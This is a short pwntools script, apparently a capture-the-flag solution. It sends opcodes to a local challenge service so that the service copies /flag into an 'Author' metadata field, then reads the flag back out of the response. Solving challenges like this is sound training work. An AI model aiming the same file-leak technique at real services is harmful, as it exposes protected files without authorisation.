from pwn import remote  # type: ignore
import os, sys, time

host = os.environ.get("HOST", "127.0.0.1")
port = int(os.environ.get("PORT", "4265"))

io = remote(host, port)

# handshake
io.send(b"\x10")       # enable
time.sleep(0.05)

# create default entry that copies /flag into "Author"
io.send(b"\x22")
time.sleep(0.05)

# request metadata bundle: Author (flag), Software, (Comment if set)
io.send(b"\x32" + b"\x01")   # 0x01 arbitrary small param

data = io.recv(timeout=2) or b""
print(f"len={len(data)} hex={data.hex()}")

# Heuristic extract: look for ASCII 'Author' then next string-ish bytes
idx = data.find(b"Author")
if idx != -1:
    # naive slice forward; adjust if you want a proper parser
    print("Found 'Author' near:", idx)
    print(data[idx:idx+256])

# clean close (optional)
io.send(b"\x11")
io.close()